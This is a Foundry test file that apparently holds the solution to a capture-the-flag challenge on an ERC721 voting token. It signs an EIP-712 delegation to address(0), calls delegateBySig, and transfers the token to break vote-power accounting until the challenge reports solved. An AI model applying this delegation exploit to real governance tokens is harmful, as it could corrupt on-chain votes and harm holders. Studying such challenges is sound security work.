// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract CounterTest is Test {
    Challenge challenge;
    VotingERC721 token;
    address player = address(0x1111);
    uint256 playerTokenId = 123;
    uint256 playerPk;

    bytes32 public constant DOMAIN_TYPEHASH =
        keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

    bytes32 public constant DELEGATION_TYPEHASH =
        keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");

    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");

        challenge = new Challenge(player);
        token = challenge.votingToken();
    }

    function test_Increment() public {
        console.log("votePower0: %e", token.getCurrentVotes(address(challenge)));
        console.log("votePower1: %e", token.getCurrentVotes(player));
        console.log("player", player);
        vm.startPrank(player);
        // Solver solver = new Solver(challenge);
        // token.setApprovalForAll(address(solver), true);
        console.log("--BEGIN--");

        address delegatee = address(0);
        uint256 nonce = token.nonces(player);
        uint256 expiry = type(uint256).max;

        bytes32 domainSeparator =
            keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(token.name())), block.chainid, address(token)));
        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

        //after player sign. it move delegation vote from player to address 0.
        token.delegateBySig(delegatee, nonce, expiry, v, r, s);
        token.transferFrom(player, address(0x1111), playerTokenId);

        console.log("votePower1: %e", token.getCurrentVotes(player));

        console.log("--END--");

        require(challenge.isSolved(), "Challenge not solved");
        vm.stopPrank();
    }
}
